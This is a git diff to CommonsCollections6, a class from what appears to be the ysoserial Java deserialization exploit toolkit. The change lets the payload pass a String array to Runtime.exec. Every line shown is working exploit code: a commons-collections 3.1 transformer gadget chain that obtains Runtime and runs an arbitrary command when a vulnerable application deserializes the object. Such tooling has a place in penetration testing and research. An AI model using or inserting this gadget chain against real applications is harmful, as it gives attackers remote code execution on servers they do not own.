@@ -35,12 +35,9 @@ import java.util.Map;
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({ Authors.MATTHIASKAISER })
-public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<Serializable> {
+public class CommonsCollections6 extends ExtendedObjectPayload<Serializable> {
 
-    public Serializable getObject(final String command) throws Exception {
-
-        final String[] execArgs = new String[] { command };
-
+    public Serializable getObject(final String[] command) throws Exception {
         final Transformer[] transformers = new Transformer[] {
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[] {
@@ -50,7 +47,7 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
                         Object.class, Object[].class }, new Object[] {
                         null, new Object[0] }),
                 new InvokerTransformer("exec",
-                        new Class[] { String.class }, execArgs),
+                        new Class[] { String[].class }, new Object[] { command }),
                 new ConstantTransformer(1) };
 
         Transformer transformerChain = new ChainedTransformer(transformers);
